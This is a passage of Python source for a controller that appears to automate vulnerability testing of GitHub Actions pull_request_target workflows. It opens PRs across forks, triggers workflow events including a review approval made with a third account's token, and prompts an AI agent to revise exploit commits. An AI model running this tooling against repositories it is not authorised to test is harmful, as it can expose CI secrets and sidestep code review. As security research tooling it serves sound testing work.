                            head=f"{user_b_head_owner}:{branch_name}",
                            base=pr_base_branch,
                        )
                    else:
                        pr, pr_creation_reason = self._create_or_reuse_pull_request(
                            client=user_b_client,
                            repo_name=user_a_fork,
                            title="Add temporary change",
                            body=f"Temporary change from {branch_name}",
                            head=f"{user_b_head_owner}:{branch_name}",
                            base=pr_base_branch,
                        )
                    if pr is not None:
                        LOGGER.info(
                            "Pull request creation succeeded for repo=%s on attempt %s/%s.",
                            repo_name or user_b_fork,
                            pr_attempt,
                            max_retries,
                        )
                        break

                    if (
                        not self._is_pr_no_commits_reason(pr_creation_reason)
                        or pr_attempt >= max_retries
                    ):
                        if self._is_pr_base_invalid_reason(pr_creation_reason):
                            return {
                                "vulnerable": False,
                                "needs_human_review": True,
                                "status": "human_review_required",
                                "reason": (
                                    "GitHub rejected PR base as invalid. "
                                    "Human review needed to select a valid target branch."
                                ),
                                "error_stage": "execution",
                                "error_class": "pr_base_validation_failed",
                                "failure_fingerprint": "pr_base_invalid",
                                "controller_signal": {
                                    "status": "needs_human_review",
                                    "reason": pr_creation_reason
                                    or "GitHub PR base invalid.",
                                    "source": "pr_base_invalid_after_creation_attempt",
                                    "selected_branch": pr_base_branch,
                                    "filter_source": (
                                        "workflow_branch_filter"
                                        if branch_filters
                                        else "repository_default_branch"
                                    ),
                                    "branch_filters": branch_filters,
                                    "branch_exists": True,
                                },
                            }
                        if self._is_pr_head_invalid_reason(pr_creation_reason):
                            if pr_attempt < max_retries:
                                LOGGER.warning(
                                    "PR creation failed with head.invalid on attempt %s/%s. "
                                    "Waiting for branch visibility and retrying.",
                                    pr_attempt,
                                    max_retries,
                                )
                                self._wait_for_branch_visibility(
                                    client=user_b_client,
                                    repo_name=user_b_fork,
                                    branch_name=branch_name,
                                    timeout_seconds=20,
                                )
                                continue
                            return {
                                "vulnerable": False,
                                "needs_human_review": True,
                                "status": "human_review_required",
                                "reason": (
                                    "GitHub rejected PR head as invalid after retries. "
                                    "Likely branch/fork visibility propagation issue or "
                                    "cross-fork PR constraint."
                                ),
                                "controller_signal": {
                                    "status": "needs_human_review",
                                    "reason": pr_creation_reason
                                    or "GitHub PR head invalid.",
                                },
                            }
                        return {
                            "vulnerable": False,
                            "reason": pr_creation_reason
                            or "Failed to create pull request for workflow execution.",
                        }

                    LOGGER.warning(
                        "PR creation failed with 'No commits between' on attempt %s/%s. "
                        "Requesting Agent to revise exploit changes and retry.",
                        pr_attempt,
                        max_retries,
                    )
                    retried = self._retry_after_pr_creation_failure(
                        workspace_path=workspace_path,
                        sandbox=sandbox,
                        branch_name=branch_name,
                        reason=pr_creation_reason or "No commits between base and head.",
                        attempt=pr_attempt,
                        agent_timeout=agent_timeout,
                        git_token=user_b_token,
                        required_path_filters=pr_path_filters,
                    )
                    if not retried:
                        return {
                            "vulnerable": False,
                            "reason": (
                                "Pull request creation failed with 422 'No commits between' "
                                "and automated exploit revision did not produce new changes."
                            ),
                        }

                if pr is None:
                    return {
                        "vulnerable": False,
                        "reason": pr_creation_reason
                        or "Failed to create pull request for workflow execution.",
                    }
            pr_number = pr.get("number")
            if not isinstance(pr_number, int):
                LOGGER.error("Failed to create PR: missing PR number in response")
                return {
                    "vulnerable": False,
                    "reason": "Failed to create pull request for workflow execution.",
                }
            monitor_repo_name = (
                ((pr.get("base") or {}).get("repo") or {}).get("full_name")
                if isinstance(pr, dict)
                else None
            )
            if not isinstance(monitor_repo_name, str) or not monitor_repo_name.strip():
                return self._build_execution_error_result(
                    reason=(
                        "Created pull request response is missing base.repo.full_name; "
                        "cannot safely monitor workflow target repository."
                    ),
                    error_class="owner_token_mismatch",
                    failure_fingerprint="owner_token_mismatch",
                )
            monitor_repo_name = monitor_repo_name.strip()
            monitor_owner = self._extract_repo_owner(monitor_repo_name)
            if (
                monitor_owner
                and expected_user_a_owner
                and monitor_owner.lower() != expected_user_a_owner.lower()
            ):
                return self._build_execution_error_result(
                    reason=(
                        "Created pull request base repository owner does not match configured User A fork owner."
                    ),
                    error_class="owner_token_mismatch",
                    failure_fingerprint="owner_token_mismatch",
                    details={
                        "monitor_repo_name": monitor_repo_name,
                        "monitor_owner": monitor_owner,
                        "expected_user_a_owner": expected_user_a_owner,
                    },
                )
            LOGGER.info(f"Created PR #{pr_number} from {user_b_fork} to {user_a_fork}")
            self._log_lifecycle_event(
                event="pr_create",
                repo=repo_name or user_b_fork,
                pr_number=pr_number,
                monitor_repo=monitor_repo_name,
                head=f"{user_b_head_owner}:{branch_name}",
                base=pr_base_branch,
            )
            pull_request_url = pr.get("html_url") or (
                f"https://github.com/{monitor_repo_name}/pull/{pr_number}"
            )
            self._print_console_pull_request_url(str(pull_request_url))

            if types_explicit and actionable_trigger_types and not synchronize_selected:
                trigger_errors: list[dict[str, str]] = []
                trigger_applied = False
                for trigger_type in actionable_trigger_types:
                    succeeded, trigger_error = self._trigger_pull_request_target_event(
                        event_type=trigger_type,
                        user_b_client=user_b_client,
                        repo_name=user_a_fork,
                        pr_number=pr_number,
                        user_a_login=user_a_login,
                        user_b_login=user_b_login,
                        current_user_b_token=user_b_token,
                        candidate_reviewer_tokens=reviewer_candidate_tokens,
                    )
                    if succeeded:
                        trigger_applied = True
                        break
                    trigger_errors.append(
                        {
                            "type": trigger_type,
                            "error": trigger_error or "unknown",
                        }
                    )
                if not trigger_applied:
                    reason = (
                        "Controller could not apply any actionable pull_request_target "
                        "trigger type for the focused workflow."
                    )
                    return {
                        "vulnerable": False,
                        "needs_human_review": True,
                        "status": "human_review_required",
                        "reason": reason,
                        "controller_signal": {
                            "status": "needs_human_review",
                            "reason": reason,
                            "source": "workflow_pr_target_trigger_application_failed",
                            "types_explicit": True,
                            "types": explicit_types,
                            "actionable_types": actionable_trigger_types,
                            "trigger_errors": trigger_errors,
                        },
                    }

            def _create_fresh_pr_for_retry(_attempt: int) -> dict[str, Any] | None:
                fresh_pr, _fresh_reason = self._create_fresh_pull_request(
                    client=user_b_client,
                    repo_name=user_a_fork,
                    title="Add temporary change",
                    body=f"Temporary change from {branch_name}",
                    head=f"{user_b_head_owner}:{branch_name}",
                    base=pr_base_branch,
                )
                if fresh_pr is None:
                    LOGGER.warning(
                        "Failed creating fresh pull request for opened-only retry: %s",
                        _fresh_reason,
                    )
                return fresh_pr

            result = self._monitor_workflow(
                client=user_a_client,
                repo_name=monitor_repo_name,
                pr_number=pr_number,
                max_retries=max_retries,
                workspace_path=workspace_path,
                sandbox=sandbox,
                branch_name=branch_name,
                user_b_login=user_b_login,
                default_branch=default_branch,
                workflow_timeout=workflow_timeout,
                focused_workflow=focused_workflow,
                path_filters=pr_path_filters,
                retry_openhands_runner=lambda: self._run_agent_with_secret_sync(
                    sandbox=sandbox,
                    workspace_path=workspace_path,
                    timeout=agent_timeout,
                    git_token=user_b_token,
                ),
                retry_requires_new_pull_request=opened_only_mode,
                create_fresh_pull_request_for_retry=(
                    _create_fresh_pr_for_retry if opened_only_mode else None
                ),
                preferred_head_sha=preferred_monitor_head_sha,
                ignored_head_shas=(
                    [bootstrap_commit_head_sha] if bootstrap_commit_head_sha else None
                ),
                pr_head_ref=f"{user_b_head_owner}:{branch_name}",
                pr_base_ref=pr_base_branch,
            )
            LOGGER.info(
                "Workflow monitoring finished for repo=%s PR #%s: vulnerable=%s status=%s reason=%s.",
                repo_name or user_b_fork,
                pr_number,
                result.get("vulnerable"),
                result.get("status"),
                str(result.get("reason") or "").strip() or "n/a",
            )

            result.update(
                {
                    "pull_request_url": pull_request_url,
                    "branch_name": branch_name,
                }
            )
            if result.get("vulnerable") is True:
                exploit_patch = self._build_exploit_patch_for_pull_request(
                    sandbox=sandbox,
                    repo_name=monitor_repo_name,
                    pr_number=pr_number,
                    pull_request_url=str(pull_request_url),
                    base_branch=pr_base_branch,
                    head_branch=branch_name,
                )
                if isinstance(exploit_patch, dict):
                    result["exploit_patch"] = exploit_patch
                try:
                    self._collect_and_persist_learning_after_success(
                        workspace_path=workspace_path,
                        repository_name=(repo_name or user_b_fork or "").strip(),
                        timeout=agent_timeout,
                        git_token=user_b_token,
                    )
                except Exception as exc:
                    LOGGER.warning(
                        "Failed collecting post-success learning for %s: %s",
                        repo_name or user_b_fork,
                        exc,
                    )
            security_report = self._generate_security_report_if_verified(
                sandbox=sandbox,
                workspace_path=workspace_path,
                timeout=agent_timeout,
                git_token=user_b_token,
                repository_name=(repo_name or user_b_fork or "").strip(),
                focused_workflow=focused_workflow,
                pull_request_url=str(pull_request_url),
                result=result,
                github_token_permissions=github_token_permissions,
                risk_index=risk_index,
            )
            if isinstance(security_report, dict):
                result["security_report"] = security_report

            return result

        finally:
            self._active_local_test_setup = None
            sandbox.stop()
            sandbox.remove()
            self._cleanup_docker_resources_after_repository_processing(
                repository_name=(repo_name or user_b_fork or "").strip()
            )
            LOGGER.info(
                "Finished execute_attack cleanup for repo=%s workspace=%s.",
                repo_name or user_b_fork,
                workspace_path,
            )

    def _resolve_pr_base_branch_from_workspace(
        self,
        *,
        workspace_path: Path,
        focused_workflow: str | None,
        default_branch: str,
    ) -> str:
        branch, _ = self._resolve_pr_base_branch_with_filters_from_workspace(
            workspace_path=workspace_path,
            focused_workflow=focused_workflow,
            default_branch=default_branch,
        )
        return branch

    def _resolve_pr_base_branch_with_filters_from_workspace(
        self,
        *,
        workspace_path: Path,
        focused_workflow: str | None,
        default_branch: str,
    ) -> tuple[str, list[str]]:
        if not focused_workflow:
            return default_branch, []

        normalized = focused_workflow.strip().replace("\\", "/")
        if not normalized:
            return default_branch, []
        if normalized.startswith("/"):
            return default_branch, []
        if normalized.startswith("./"):
            normalized = normalized[2:]

        workflow_path = workspace_path / normalized
        if not workflow_path.exists() or not workflow_path.is_file():
            return default_branch, []

        try:
            workflow_content = workflow_path.read_text(encoding="utf-8")
        except OSError:
            return default_branch, []

        filters = parse_pull_request_target_filters(workflow_content)
        branch_filters = filters.get("branches") or []
        if not branch_filters:
            return default_branch, []
        for pattern in branch_filters:
            if fnmatch.fnmatch(default_branch, pattern):
                return default_branch, branch_filters
        return branch_filters[0], branch_filters

    def _resolve_pr_path_filters_from_workspace(
        self,
        *,
        workspace_path: Path,
        focused_workflow: str | None,
    ) -> list[str]:
        if not focused_workflow:
            return []

        normalized = focused_workflow.strip().replace("\\", "/")
        if not normalized:
            return []
        if normalized.startswith("/"):
            return []
        if normalized.startswith("./"):
            normalized = normalized[2:]

        workflow_path = workspace_path / normalized
        if not workflow_path.exists() or not workflow_path.is_file():
            return []

        try:
            workflow_content = workflow_path.read_text(encoding="utf-8")
        except OSError:
            return []

        filters = parse_pull_request_target_filters(workflow_content)
        return filters.get("paths") or []

    def _resolve_pr_target_types_from_workspace(
        self,
        *,
        workspace_path: Path,
        focused_workflow: str | None,
    ) -> tuple[bool, list[str]]:
        if not focused_workflow:
            return False, []

        normalized = focused_workflow.strip().replace("\\", "/")
        if not normalized:
            return False, []
        if normalized.startswith("/"):
            return False, []
        if normalized.startswith("./"):
            normalized = normalized[2:]

        workflow_path = workspace_path / normalized
        if not workflow_path.exists() or not workflow_path.is_file():
            return False, []

        try:
            workflow_content = workflow_path.read_text(encoding="utf-8")
        except OSError:
            return False, []

        filters = parse_pull_request_target_filters(workflow_content)
        raw_types = filters.get("types")
        workflow_types = (
            [item for item in raw_types if isinstance(item, str) and item.strip()]
            if isinstance(raw_types, list)
            else []
        )
        types_explicit = bool(filters.get("types_explicit") is True)
        return types_explicit, workflow_types

    def _build_pull_request_target_trigger_plan(
        self,
        *,
        types_explicit: bool,
        workflow_types: list[str],
    ) -> dict[str, Any]:
        if not types_explicit:
            return {
                "mode": "implicit_default",
                "actionable_types": [],
                "non_actionable_types": [],
                "explicit_types": [],
            }

        normalized = [item.strip().lower() for item in workflow_types if item.strip()]
        normalized_set = set(normalized)
        actionable_types = [
            item for item in ACTIONABLE_PR_TARGET_TYPE_PRIORITY if item in normalized_set
        ]
        non_actionable_types = [
            item
            for item in sorted(NON_ACTIONABLE_PR_TARGET_TYPES)
            if item in normalized_set
        ]

        if actionable_types:
            return {
                "mode": "explicit_actionable",
                "actionable_types": actionable_types,
                "non_actionable_types": non_actionable_types,
                "explicit_types": sorted(normalized_set),
            }

        if non_actionable_types:
            return {
                "mode": "explicit_non_actionable_only",
                "actionable_types": [],
                "non_actionable_types": non_actionable_types,
                "explicit_types": sorted(normalized_set),
            }

        return {
            "mode": "explicit_unknown_only",
            "actionable_types": [],
            "non_actionable_types": [],
            "explicit_types": sorted(normalized_set),
        }

    def _resolve_token_login(self, token: str) -> str | None:
        token_key = token.strip()
        if not token_key:
            return None
        if token_key in self._token_login_cache:
            return self._token_login_cache[token_key]
        try:
            client = self._github_client_factory(token_key)
            login = str((client.get_authenticated_user() or {}).get("login") or "").strip()
            resolved = login or None
        except Exception as exc:
            LOGGER.warning("Failed resolving token login: %s", exc)
            resolved = None
        self._token_login_cache[token_key] = resolved
        return resolved

    def _select_third_reviewer_candidate(
        self,
        *,
        candidate_tokens: list[str],
        user_a_login: str,
        user_b_login: str,
        current_user_b_token: str,
    ) -> tuple[str, str] | None:
        blocked_logins = {
            user_a_login.strip().lower(),
            user_b_login.strip().lower(),
        }
        current_token = current_user_b_token.strip()
        for token in candidate_tokens:
            token_value = token.strip()
            if not token_value or token_value == current_token:
                continue
            login = self._resolve_token_login(token_value)
            if not login or login.lower() in blocked_logins:
                continue
            return token_value, login
        return None

    def _close_open_pull_requests_for_head_base(
        self,
        *,
        client: GitHubClient,
        repo_name: str,
        head: str,
        base: str,
    ) -> None:
        try:
            pull_requests = client.list_pull_requests(
                repo_name=repo_name,
                state="open",
                head=head,
                base=base,
            )
        except Exception as exc:
            LOGGER.warning(
                "Failed listing open pull requests before fresh create for %s (%s -> %s): %s",
                repo_name,
                head,
                base,
                exc,
            )
            return
        for pull_request in pull_requests:
            number = pull_request.get("number")
            if not isinstance(number, int):
                continue
            try:
                client.close_pull_request(repo_name, number)
            except Exception as exc:
                LOGGER.warning(
                    "Failed closing existing pull request #%s before fresh create: %s",
                    number,
                    exc,
                )

    def _create_fresh_pull_request(
        self,
        *,
        client: GitHubClient,
        repo_name: str,
        title: str,
        body: str,
        head: str,
        base: str,
    ) -> tuple[dict[str, Any] | None, str | None]:
        self._close_open_pull_requests_for_head_base(
            client=client,
            repo_name=repo_name,
            head=head,
            base=base,
        )
        max_attempts = 3
        create_error: GitHubApiError | None = None
        for attempt in range(1, max_attempts + 1):
            try:
                pull_request = client.create_pull_request(
                    repo_name=repo_name,
                    title=title,
                    body=body,
                    head=head,
                    base=base,
                )
                return pull_request, None
            except GitHubApiError as exc:
                create_error = exc
                if not self._is_pr_validation_error(exc):
                    raise
                if self._is_pr_head_not_ready_error(exc) and attempt < max_attempts:
                    wait_seconds = float(2 ** (attempt - 1))
                    LOGGER.warning(
                        "GitHub returned 422 while creating fresh PR for %s (%s). "
                        "Retrying in %.1f seconds (%s/%s).",
                        repo_name,
                        exc,
                        wait_seconds,
                        attempt,
                        max_attempts,
                    )
                    time.sleep(wait_seconds)
                    continue
                if self._is_pr_no_commits_error(exc):
                    return (
                        None,
                        "GitHub rejected pull request creation with 422 because there "
                        "are no commits between base and head. This usually means no "
                        "effective code diff was pushed for workflow execution.",
                    )
                return None, f"GitHub rejected pull request creation with 422: {exc}"
        if create_error is not None:
            return (
                None,
                "GitHub rejected pull request creation with 422 after retries: "
                f"{create_error}",
            )
        return None, "Failed to create pull request for workflow execution."

    def _trigger_pull_request_target_event(
        self,
        *,
        event_type: str,
        user_b_client: GitHubClient,
        repo_name: str,
        pr_number: int,
        user_a_login: str,
        user_b_login: str,
        current_user_b_token: str,
        candidate_reviewer_tokens: list[str],
    ) -> tuple[bool, str | None]:
        event = event_type.strip().lower()
        if not event:
            return False, "empty event type"
        if event == "opened":
            return True, None

        try:
            if event == "reopened":
                user_b_client.close_pull_request(repo_name, pr_number)
                user_b_client.update_pull_request(
                    repo_name, pr_number, state="open"
                )
                return True, None
            if event == "edited":
                pull_request = user_b_client.get_pull_request(repo_name, pr_number)
                title = str(pull_request.get("title") or "Add temporary change")
                body = str(pull_request.get("body") or "")
                if EDITED_TRIGGER_MARKER in body:
                    updated_body = body.replace(EDITED_TRIGGER_MARKER, "").strip()
                else:
                    updated_body = (
                        f"{body}\n\n{EDITED_TRIGGER_MARKER}".strip()
                        if body
                        else EDITED_TRIGGER_MARKER
                    )
                user_b_client.update_pull_request(
                    repo_name,
                    pr_number,
                    title=title,
                    body=updated_body,
                )
                return True, None
            if event == "review_requested":
                reviewer = self._select_third_reviewer_candidate(
                    candidate_tokens=candidate_reviewer_tokens,
                    user_a_login=user_a_login,
                    user_b_login=user_b_login,
                    current_user_b_token=current_user_b_token,
                )
                if reviewer is None:
                    return (
                        False,
                        "No eligible third reviewer token (distinct from User A and User B) "
                        "is available in the User B token pool.",
                    )
                reviewer_token, reviewer_login = reviewer
                reviewer_client = self._github_client_factory(reviewer_token)
                user_b_client.request_pull_request_reviewers(
                    repo_name,
                    pr_number,
                    reviewers=[reviewer_login],
                )
                reviewer_client.create_pull_request_review(
                    repo_name,
                    pr_number,
                    event="APPROVE",
                    body=REVIEW_REQUEST_APPROVAL_BODY,
                )
                user_b_client.request_pull_request_reviewers(
                    repo_name,
                    pr_number,
                    reviewers=[reviewer_login],
                )
                return True, None
            if event == "review_request_removed":
                reviewer = self._select_third_reviewer_candidate(
                    candidate_tokens=candidate_reviewer_tokens,
                    user_a_login=user_a_login,
                    user_b_login=user_b_login,
                    current_user_b_token=current_user_b_token,
                )
                if reviewer is None:
                    return (
                        False,
                        "No eligible reviewer identity is available to trigger review_request_removed.",
                    )
                _, reviewer_login = reviewer
                user_b_client.request_pull_request_reviewers(
                    repo_name,
                    pr_number,
                    reviewers=[reviewer_login],
                )
                user_b_client.remove_pull_request_reviewers(
                    repo_name,
                    pr_number,
                    reviewers=[reviewer_login],
                )
                return True, None
            if event == "assigned":
                user_b_client.add_issue_assignees(repo_name, pr_number, [user_b_login])
                return True, None
            if event == "unassigned":
                user_b_client.add_issue_assignees(repo_name, pr_number, [user_b_login])
                user_b_client.remove_issue_assignees(repo_name, pr_number, [user_b_login])
                return True, None
            if event == "ready_for_review":
                user_b_client.convert_pull_request_to_draft(repo_name, pr_number)
                user_b_client.ready_pull_request_for_review(repo_name, pr_number)
                return True, None
            if event == "converted_to_draft":
                user_b_client.convert_pull_request_to_draft(repo_name, pr_number)
                return True, None
            if event == "closed":
                user_b_client.close_pull_request(repo_name, pr_number)
                return True, None
            if event == "synchronize":
                return True, None
            return False, f"Unsupported trigger type `{event}`."
        except Exception as exc:
            return False, str(exc)

    def _branch_exists(
        self, *, client: GitHubClient, repo_name: str, branch: str
    ) -> bool:
        try:
            client.get_branch_head_sha(repo_name, branch)
        except GitHubApiError as exc:
            if "404" in str(exc):
                return False
            raise
        return True

    def _resolve_or_create_patterned_pr_base_branch(
        self,
        *,
        client: GitHubClient,
        repo_name: str,
        branch_pattern: str,
        source_branch: str,
        branch_token: str,
    ) -> tuple[str | None, str | None]:
        candidate = self._materialize_branch_pattern(
            pattern=branch_pattern,
            token=branch_token,
        )
        if not candidate:
            return (
                None,
                (
                    f"Focused workflow pull_request_target branch filter `{branch_pattern}` "
                    "could not be converted into a concrete branch name."
                ),
            )

        if self._branch_exists(client=client, repo_name=repo_name, branch=candidate):
            return candidate, None

        try:
            source_sha = client.get_branch_head_sha(repo_name, source_branch)
        except GitHubApiError as exc:
            if "404" in str(exc):
                return (
                    None,
                    (
                        f"Focused workflow pull_request_target branch filter selected `{branch_pattern}`, "
                        f"but source branch `{source_branch}` does not exist on `{repo_name}`."
                    ),
                )
            raise

        try:
            client.create_branch(repo_name, candidate, source_sha)
            LOGGER.info(
                "Created target branch `%s` on `%s` from `%s` to satisfy branch pattern `%s`.",
                candidate,
                repo_name,
                source_branch,
                branch_pattern,
            )
            return candidate, None
        except GitHubApiError as exc:
            lowered = str(exc).lower()
            if "422" in lowered and "already exists" in lowered:
                return candidate, None
            return (
                None,
                (
                    f"Focused workflow pull_request_target branch filter selected `{branch_pattern}`, "
                    f"but failed creating branch `{candidate}` on `{repo_name}`: {exc}"
                ),
            )

    @staticmethod
    def _materialize_branch_pattern(*, pattern: str, token: str) -> str | None:
        candidate = pattern.strip()
        if not candidate:
            return None

        safe_token = re.sub(r"[^A-Za-z0-9._/-]+", "-", token).strip("-")
        if not safe_token:
            safe_token = "pwnhunter-target"

        candidate = re.sub(r"\*+", safe_token, candidate)
        candidate = re.sub(r"\?+", "x", candidate)
        candidate = re.sub(r"\[[^\]]+\]", "x", candidate)
        candidate = candidate.strip("/")
        if not candidate or _has_wildcards(candidate):
            return None
        return candidate

    def _create_or_reuse_pull_request(
        self,
        *,
        client: GitHubClient,
        repo_name: str,
        title: str,
        body: str,
        head: str,
        base: str,
    ) -> tuple[dict[str, Any] | None, str | None]:
        create_error: GitHubApiError | None = None
        max_attempts = 3

        for attempt in range(1, max_attempts + 1):
            try:
                pr = client.create_pull_request(
                    repo_name=repo_name,
                    title=title,
                    body=body,
                    head=head,
                    base=base,
                )
                return pr, None
            except GitHubApiError as exc:
                create_error = exc
                if not self._is_pr_validation_error(exc):
                    raise

                if self._is_pr_head_not_ready_error(exc) and attempt < max_attempts:
                    wait_seconds = float(2 ** (attempt - 1))
                    LOGGER.warning(
                        "GitHub returned 422 while creating PR for %s (%s). "
                        "Retrying in %.1f seconds (%s/%s).",
                        repo_name,
                        exc,
                        wait_seconds,
                        attempt,
                        max_attempts,
                    )
                    time.sleep(wait_seconds)
                    continue

                existing_pr = self._find_existing_open_pr(
                    client=client,
                    repo_name=repo_name,
                    head=head,
                    base=base,
                )
                if existing_pr is not None:
                    LOGGER.info(
                        "Reusing existing pull request #%s for %s (%s -> %s).",
                        existing_pr.get("number"),
                        repo_name,
                        head,
                        base,
                    )
                    return existing_pr, None

                if self._is_pr_no_commits_error(exc):
                    reason = (
                        "GitHub rejected pull request creation with 422 because there "
                        "are no commits between base and head. This usually means no "
                        "effective code diff was pushed for workflow execution."
                    )
                    LOGGER.warning("%s Raw error: %s", reason, exc)
                    return None, reason

                reason = f"GitHub rejected pull request creation with 422: {exc}"
                LOGGER.warning("%s", reason)
                return None, reason

        if create_error is not None:
            if self._is_pr_validation_error(create_error):
                reason = (
                    "GitHub rejected pull request creation with 422 after retries: "
                    f"{create_error}"
                )
                LOGGER.warning("%s", reason)
                return None, reason
            raise create_error
        return None, "Failed to create pull request for workflow execution."

    def _find_existing_open_pr(
        self,
        *,
        client: GitHubClient,
        repo_name: str,
        head: str,
        base: str,
    ) -> dict[str, Any] | None:
        try:
            pull_requests = client.list_pull_requests(
                repo_name=repo_name,
                state="open",
                head=head,
                base=base,
            )
        except GitHubApiError as exc:
            LOGGER.warning(
                "Failed to list open pull requests for %s (%s -> %s): %s",
                repo_name,
                head,
                base,
                exc,
            )
            return None

        for pull_request in pull_requests:
            if isinstance(pull_request.get("number"), int):
                return pull_request
        return None

    @staticmethod
    def _is_pr_validation_error(exc: GitHubApiError) -> bool:
        message = str(exc)
        return "/pulls" in message and " 422 " in message

    @staticmethod
    def _is_pr_no_commits_error(exc: GitHubApiError) -> bool:
        return "no commits between" in str(exc).lower()

    @staticmethod
    def _is_pr_no_commits_reason(reason: str | None) -> bool:
        if not isinstance(reason, str):
            return False
        return "no commits between" in reason.lower()

    @staticmethod
    def _is_pr_head_invalid_reason(reason: str | None) -> bool:
        if not isinstance(reason, str):
            return False
        lowered = reason.lower()
        return "head.invalid" in lowered or ("head" in lowered and "invalid" in lowered)

    @staticmethod
    def _is_pr_base_invalid_reason(reason: str | None) -> bool:
        if not isinstance(reason, str):
            return False
        lowered = reason.lower()
        return "base.invalid" in lowered or ("base" in lowered and "invalid" in lowered)

    @staticmethod
    def _is_pr_head_not_ready_error(exc: GitHubApiError) -> bool:
        message = str(exc).lower()
        if "head" not in message:
            return False
        return (
            "not found" in message
            or "invalid" in message
            or "sha can't be blank" in message
            or "sha cannot be blank" in message
        )

    def _wait_for_branch_visibility(
        self,
        *,
        client: GitHubClient,
        repo_name: str,
        branch_name: str,
        timeout_seconds: int,
    ) -> None:
        deadline = time.time() + timeout_seconds
        last_error: Exception | None = None
        while time.time() < deadline:
            try:
                sha = client.get_branch_head_sha(repo_name, branch_name)
            except Exception as exc:
                last_error = exc
                time.sleep(2.0)
                continue
            if sha:
                LOGGER.info(
                    "Confirmed branch visibility for %s:%s at %s",
                    repo_name,
                    branch_name,
                    sha,
                )
                return
            time.sleep(2.0)
        if last_error is not None:
            LOGGER.warning(
                "Timed out waiting for branch visibility for %s:%s (%s)",
                repo_name,
                branch_name,
                last_error,
            )
        else:
            LOGGER.warning(
                "Timed out waiting for branch visibility for %s:%s",
                repo_name,
                branch_name,
            )

    def _retry_after_pr_creation_failure(
        self,
        *,
        workspace_path: Path,
        sandbox: RepositorySandbox,
        branch_name: str,
        reason: str,
        attempt: int,
        agent_timeout: int,
        git_token: str,
        required_path_filters: list[str] | None = None,
    ) -> bool:
        prompt_path = workspace_path.parent / AGENT_TASK_FILENAME
        if not prompt_path.exists():
            LOGGER.warning(
                "Cannot retry Agent after PR creation failure: missing prompt file %s",
                prompt_path,
            )
            return False

        current_prompt = prompt_path.read_text(encoding="utf-8")
        updated_prompt = current_prompt + (
            f"\n\n## Pull Request Creation Failed (Attempt {attempt})\n\n"
            f"GitHub returned a PR validation error: {reason}\n\n"
            "This indicates the current branch did not contain an effective diff "
            "for the target base. Update the exploit attempt by modifying the most "
            "relevant workflow-executed files and ensure there are concrete code "
            "changes before finishing.\n"
        )
        prompt_path.write_text(updated_prompt, encoding="utf-8")

        workspace_path.mkdir(parents=True, exist_ok=True)
        self._prepare_agent_prompt_in_workspace(workspace_path)
        openhands_result = self._run_agent_with_secret_sync(
            sandbox=sandbox,
            workspace_path=workspace_path,
            timeout=agent_timeout,
            git_token=git_token,
        )
        if not openhands_result.get("ok"):
            LOGGER.warning(
                "Retry Agent execution after PR creation failure failed "
                "(exit code: %s).",
                openhands_result.get("exit_code"),
            )
            return False

        commit_result = self._commit_and_push_in_sandbox(
            sandbox=sandbox,
            branch=branch_name,
            workspace_path=workspace_path,
            required_path_filters=required_path_filters,
        )
        return bool(commit_result.get("committed"))

    def _retry_after_non_committable_changes(
        self,
        *,
        workspace_path: Path,
        sandbox: RepositorySandbox,
        branch_name: str,
        attempt: int,
        agent_timeout: int,
        git_token: str,
        required_path_filters: list[str] | None = None,
    ) -> dict[str, Any]:
        prompt_path = workspace_path.parent / AGENT_TASK_FILENAME
        if not prompt_path.exists():
            LOGGER.warning(
                "Cannot retry Agent after non-committable changes: missing prompt file %s",
                prompt_path,
            )
            return {"committed": False}

        changed_paths = self._list_changed_paths_in_sandbox(sandbox)
        changed_paths_summary = (
            "\n".join(f"- {path}" for path in changed_paths[:20])
            if changed_paths
            else "- (unable to determine changed files)"
        )
        current_prompt = prompt_path.read_text(encoding="utf-8")
        updated_prompt = current_prompt + (
            f"\n\n## Controller Feedback: Non-Committable Changes (Attempt {attempt})\n\n"
            "The repository has file changes, but none were eligible for controller "
            "commit.\n"
            "Update your exploit so at least one meaningful file is "
            "changed.\n\n"
            f"Detected changed files:\n{changed_paths_summary}\n"
        )
        prompt_path.write_text(updated_prompt, encoding="utf-8")

        workspace_path.mkdir(parents=True, exist_ok=True)
        self._prepare_agent_prompt_in_workspace(workspace_path)
        openhands_result = self._run_agent_with_secret_sync(
            sandbox=sandbox,
            workspace_path=workspace_path,
            timeout=agent_timeout,
            git_token=git_token,
        )
        if not openhands_result.get("ok"):
            LOGGER.warning(
                "Retry Agent execution after non-committable changes failed "
                "(exit code: %s).",
                openhands_result.get("exit_code"),
            )
            return {"committed": False}

        controller_signal = self._read_controller_signal_from_sandbox(sandbox)
        if controller_signal is not None:
            return {"committed": False, "controller_signal": controller_signal}

        commit_result = self._commit_and_push_in_sandbox(
            sandbox=sandbox,
            branch=branch_name,
            workspace_path=workspace_path,
            required_path_filters=required_path_filters,
        )
        return {"committed": bool(commit_result.get("committed"))}

    def _retry_after_no_changes(
        self,
        *,
        workspace_path: Path,
        sandbox: RepositorySandbox,
        branch_name: str,
        attempt: int,
        agent_timeout: int,
        git_token: str,
        required_path_filters: list[str] | None = None,
    ) -> dict[str, Any]:
        prompt_path = workspace_path.parent / AGENT_TASK_FILENAME
        if not prompt_path.exists():
            LOGGER.warning(
                "Cannot retry Agent after no-change result: missing prompt file %s",
                prompt_path,
            )
            return {"committed": False}

        current_prompt = prompt_path.read_text(encoding="utf-8")
        updated_prompt = current_prompt + (
            f"\n\n## Controller Feedback: No Changes Produced (Attempt {attempt})\n\n"
            "The last attempt produced no repository file changes. Do not finish "
            "without a concrete outcome.\n"
            "If the repository is not exploitable, update `agent-output.json` with "
            '`vulnerable: "no"` and a concise `reason`. Otherwise, revise the exploit and produce concrete '
            "file changes.\n"
        )
        prompt_path.write_text(updated_prompt, encoding="utf-8")

        workspace_path.mkdir(parents=True, exist_ok=True)
        self._prepare_agent_prompt_in_workspace(workspace_path)
        openhands_result = self._run_agent_with_secret_sync(
            sandbox=sandbox,
            workspace_path=workspace_path,
            timeout=agent_timeout,
            git_token=git_token,
        )
        if not openhands_result.get("ok"):
            LOGGER.warning(
                "Retry Agent execution after no-change result failed "
                "(exit code: %s).",
                openhands_result.get("exit_code"),
            )
            return {"committed": False}

        controller_signal = self._read_controller_signal_from_sandbox(sandbox)
        if controller_signal is not None:
            return {"committed": False, "controller_signal": controller_signal}

        commit_result = self._commit_and_push_in_sandbox(
            sandbox=sandbox,
            branch=branch_name,
            workspace_path=workspace_path,
            required_path_filters=required_path_filters,
        )
        return {"committed": bool(commit_result.get("committed"))}

    def _sandbox_has_any_changes(self, sandbox: RepositorySandbox) -> bool:
